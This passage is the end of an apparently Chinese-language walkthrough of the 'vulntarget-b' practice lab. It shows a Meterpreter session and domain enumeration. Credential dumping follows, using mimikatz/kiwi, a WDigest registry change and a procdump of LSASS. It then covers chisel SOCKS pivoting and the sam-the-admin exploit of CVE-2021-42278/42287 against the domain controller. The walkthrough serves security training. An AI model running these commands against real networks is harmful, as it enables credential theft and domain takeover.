<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Sending stage (203846 bytes) to 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Meterpreter session 7 opened (127.0.0.1:4444 -&gt; 127.0.0.1:37890) at 2025-02-03 21:04:05 +0800</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; getuid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server username: NT AUTHORITY\SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; sysinfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Computer        : WIN10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OS              : Windows 10 (10.0 Build 18363).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Architecture    : x64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">System Language : zh_CN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain          : VULNTARGET</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Logged On Users : 7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Meterpreter     : x64/windows</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="win10-抓取域信息">win10 抓取域信息<a href="#win10-抓取域信息" class="hash-link" aria-label="win10 抓取域信息的直接链接" title="win10 抓取域信息的直接链接">​</a></h2>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; run post/windows/gather/enum_domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Domain FQDN: vulntarget.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Domain NetBIOS Name: VULNTARGET</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Domain Controller: WIN-UH20PRD3EAO.vulntarget.com (IP: 10.0.10.100)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>直接抓取密码会失败</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; load kiwi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Loading extension kiwi...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  .#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;## v ##&#x27;        Vincent LE TOUX            (vincent.letoux@gmail.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27;#####&#x27;         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Success.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; creds_all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Running as SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Retrieving all credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msv credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">===============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username       Domain      NTLM                              SHA1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------       ------      ----                              ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator  WIN10       579da618cfbfa85247acf1f800a280a4  39f572eceeaa2174e87750b52071582fc7f13118</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN10$         VULNTARGET  5d35b34708ecc51f89410a3b5e2189a3  bb9ee2d8ae83b56766f05625aa6bd8069cc51a3c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wdigest credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">===================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username       Domain      Password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------       ------      --------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(null)         (null)      (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator  WIN10       (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN10$         VULNTARGET  (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kerberos credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">====================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username       Domain          Password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------       ------          --------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(null)         (null)          (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator  WIN10           (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN10$         vulntarget.com  76 35 f7 b0 3b 4c bb a7 4c 3b 70 18 97 a7 0f eb ca 2f c3 63 27 48 a4 6e 8f 60 13 38 8b 8b 12 e1 69 e5 48 52 9f 9c 3b 11 41 0d 4c ed 96 a4 a0 9d c5 b5 0b 00 1c 71 4c 41 90 6e 6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               0 21 33 57 a1 c3 03 e1 83 4c 64 0e 45 8a ec d4 8a 32 8d 26 94 86 43 01 d2 8e 0b 7a a9 71 82 dd af cb 83 15 4c 5a 07 79 58 b9 a9 52 1b 90 d3 2e bc 90 87 12 cf 90 12 17 2d 44 1e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                81 19 df 8e 4c 69 1c 94 07 32 1c d2 6e 63 02 6f a8 3c a9 0f 9d 83 c8 e0 57 50 ba 56 09 5e eb 09 78 0a 31 cb 69 ff b2 6e 6c a6 92 5c d7 6b d0 a5 39 20 f0 0d ef 47 63 ae 3f 1e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               53 ae 2c 06 ea b4 7f e5 7d 00 06 7b 7e 45 42 2f 58 da df ea cc 28 18 de de cd 9e c8 ff 9b 91 ed 45 f6 08 87 56 39 46 ac a6 cd 87 9a e8 2e 9b d6 5b bb cd bb d9 c3 f8 1c a3 d7 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               4 c8 71 0c 3e 5f 01</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">win10$         VULNTARGET.COM  (null)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>两种方案，一种是修改注册表之后重启，可以看到明文密码</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>另外一种，就是利用 <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener noreferrer">ProcDump - Sysinternals | Microsoft Learn</a> 抓取 LSASS 进程的内存，然后本地用mimikatz进行分析</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># win10 capture memory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># analysis memory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.\mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可得到域成员的凭据 <code>vulntarget.com/win101:admin#123</code></p>
<p>剩下一台内网域控，在二层内网</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dc-impersonate-da">DC Impersonate DA<a href="#dc-impersonate-da" class="hash-link" aria-label="DC Impersonate DA的直接链接" title="DC Impersonate DA的直接链接">​</a></h2>
<p>先建立代理</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># centos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(remote) www@localhost.localdomain:/tmp$ ./chisel_1.9.1_linux_amd64 client 192.168.200.128:1337 0.0.0.0:1337:192.168.200.128:1337 &amp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[4] 38751</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2025/02/03 21:19:29 client: Connecting to ws://192.168.200.128:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2025/02/03 21:19:29 client: tun: proxy#1337=&gt;192.168.200.128:1337: Listening</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2025/02/03 21:19:29 client: Connected (Latency 896.553µs)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># win10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\Public&gt;.\chisel_1.9.1_windows_amd6.exe client 10.0.20.30:1337 R:0.0.0.0:10001:socks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2025/02/03 21:20:38 client: Connecting to ws://10.0.20.30:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2025/02/03 21:20:38 client: Connected (Latency 1.9919ms)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>尝试使用 <a href="https://github.com/safebuffer/sam-the-admin" target="_blank" rel="noopener noreferrer">safebuffer/sam-the-admin: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user</a> 进行利用</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark㉿kali)-[~]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains python3 ./tools/sam-the-admin/sam_the_admin.py &quot;vulntarget.com/win101:admin#123&quot; -dc-ip 10.0.10.100 -shell       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] config file found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:389  ...  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] WARNING: Target host is not a DC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Selected Target win-uh20prd3eao.vulntarget.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Total Domain Admins 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] will try to impersonate Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Current ms-DS-MachineAccountQuota = 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Adding Computer Account &quot;SAMTHEADMIN-55$&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] MachineAccount &quot;SAMTHEADMIN-55$&quot; password = kXNCabfMO0H)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:135  ...  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:445  ...  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Successfully added machine account SAMTHEADMIN-55$ with password kXNCabfMO0H).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] SAMTHEADMIN-55$ object = CN=SAMTHEADMIN-55,CN=Computers,DC=vulntarget,DC=com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] SAMTHEADMIN-55$ sAMAccountName == win-uh20prd3eao</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:88  ...  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:88  ...  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Saving ticket in win-uh20prd3eao.ccache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Resting the machine account to SAMTHEADMIN-55$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Restored SAMTHEADMIN-55$ sAMAccountName to original value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Using TGT from cache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Impersonating Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*]     Requesting S4U2self</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:88  ...  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Saving ticket in Administrator.ccache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] DLL init: proxychains-ng 4.17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[proxychains] Strict chain  ...  127.0.0.1:10005  ...  10.0.10.100:445  ...  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[!] Launching semi-interactive shell - Careful what you execute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\system32&gt;whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nt authority\system</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/Vulntarget/vulntarget-b/index.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/Target-Machines-WriteUp/docs/Independent-Environment/Vulntarget/vulntarget-a/"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">vulntarget-a</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#简介" class="table-of-contents__link toc-highlight">简介</a></li><li><a href="#centos-虚拟机修复" class="table-of-contents__link toc-highlight"><code>centos</code> 虚拟机修复</a></li><li><a href="#centos-侦察" class="table-of-contents__link toc-highlight">centos 侦察</a></li><li><a href="#web-1921682001281-侦察" class="table-of-contents__link toc-highlight">Web <code>192.168.200.12:81</code> 侦察</a></li><li><a href="#centos-极致-cms-文件上传构建-webshell" class="table-of-contents__link toc-highlight">centos 极致 CMS 文件上传构建 webshell</a></li><li><a href="#centos-webshell-绕过-disable_functions" class="table-of-contents__link toc-highlight">centos webshell 绕过 disable_functions</a></li><li><a href="#centos-提权至-root" class="table-of-contents__link toc-highlight">centos 提权至 root</a></li><li><a href="#centos-上线-metasploit-持久化" class="table-of-contents__link toc-highlight">centos 上线 Metasploit 持久化</a></li><li><a href="#搭建内网代理" class="table-of-contents__link toc-highlight">搭建内网代理</a></li><li><a href="#一层内网探测" class="table-of-contents__link toc-highlight">一层内网探测</a></li><li><a href="#win10-web-服务侦察" class="table-of-contents__link toc-highlight">win10 web 服务侦察</a></li><li><a href="#win10-zentao-任意文件上传" class="table-of-contents__link toc-highlight">win10 Zentao 任意文件上传</a></li><li><a href="#win10-持久化" class="table-of-contents__link toc-highlight">win10 持久化</a></li><li><a href="#win10-提权" class="table-of-contents__link toc-highlight">win10 提权</a></li><li><a href="#win10-抓取域信息" class="table-of-contents__link toc-highlight">win10 抓取域信息</a></li><li><a href="#dc-impersonate-da" class="table-of-contents__link toc-highlight">DC Impersonate DA</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 TryHackMyOffsecBox 🇨🇳 Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>